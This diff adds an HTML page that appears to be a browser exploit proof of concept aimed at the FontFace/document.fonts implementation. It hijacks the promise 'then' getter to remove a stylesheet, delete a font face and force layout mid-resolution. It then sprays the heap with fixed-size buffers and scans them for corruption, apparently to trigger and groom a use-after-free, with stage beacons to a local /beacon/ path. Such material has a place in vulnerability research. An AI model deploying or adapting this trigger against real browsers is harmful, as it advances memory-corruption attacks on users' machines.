@@ -1,0 +1,80 @@
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>par</title>
+<style id="victim-style">
+.test { font-family: x, monospace; }
+</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+var ARM = {};
+(function(){
+  var h = (location.hash || '').replace(/^#/, '');
+  h.split('&').forEach(function(p){ var kv = p.split('='); if (kv[0]) ARM[kv[0]] = kv[1]; });
+})();
+var KIND = ARM.kind || 'none';
+var FILL = ARM.fill || '41';
+var N    = parseInt(ARM.n || '1', 10);
+window.__kids = [];
+function alloc() {
+  if (KIND === 'none') return;
+  for (var i = 0; i < N; i++) {
+    if (KIND === 'str') {
+      var arr = new Array(128);
+      for (var k = 0; k < 128; k++) arr[k] = (FILL === '00') ? 0 : 0x4141;
+      var s = String.fromCharCode.apply(null, arr);
+      window.__kids.push(s);
+    } else {
+      var buf = new ArrayBuffer(274), u = new Uint8Array(buf), v = (FILL === '00') ? 0 : 0x41;
+      for (var k2 = 0; k2 < 274; k2++) u[k2] = v;
+      window.__kids.push(buf);
+    }
+  }
+}
+(function(){
+function run(){
+  b('PAR-ARM-kind' + KIND + '-fill' + FILL + '-n' + N);
+  var f = new FontFace('x', 'local("Helvetica")');
+  document.fonts.add(f);
+  var proto = FontFace.prototype;
+  if (!Object.getOwnPropertyDescriptor(proto, 'then')) {
+    Object.defineProperty(proto, 'then', {
+      get: function(){
+        b('PAR-GETTER-ENTER');
+        var v = document.getElementById('victim-style');
+        if (v) v.remove();
+        b('PAR-STYLE-REMOVED');
+        try { document.fonts.delete(this); } catch (e) {}
+        b('PAR-DELETED');
+        document.body.offsetHeight;
+        b('PAR-LAYOUT-DONE');
+        alloc();
+        b('PAR-ALLOC-DONE');
+        var r = 'err';
+        try { r = document.fonts.check('1em x'); } catch (e) { r = 'throw'; }
+        b('PAR-CHECK-' + r);
+        b('PAR-GETTER-RETURN');
+        return undefined;
+      },
+      set: function(){}
+    });
+  }
+  document.fonts.load('1em x').then(
+    function(){ b('PAR-RESOLVED'); },
+    function(){ b('PAR-REJECTED'); }
+  );
+  b('PAR-LOAD-CALLED');
+  setTimeout(function(){
+    var k = window.__kids[0], diffs = 0, len = 0;
+    if (typeof k === 'string') {
+      len = k.length;
+      for (var i = 0; i < len; i++) if (k.charCodeAt(i) !== ((FILL === '00') ? 0 : 0x4141)) diffs++;
+    } else if (k) {
+      var u = new Uint8Array(k); len = u.length;
+      for (var j = 0; j < len; j++) if (u[j] !== ((FILL === '00') ? 0 : 0x41)) diffs++;
+    }
+    b('PAR-SCAN-len' + len + '-diffs' + diffs);
+    b('PAR-DONE');
+  }, 1200);
+}
+if (document.readyState === 'complete' || document.readyState === 'interactive') setTimeout(run, 0);
+else document.addEventListener('DOMContentLoaded', run);
+})();
+</script></head><body><p class="test">A</p></body></html>
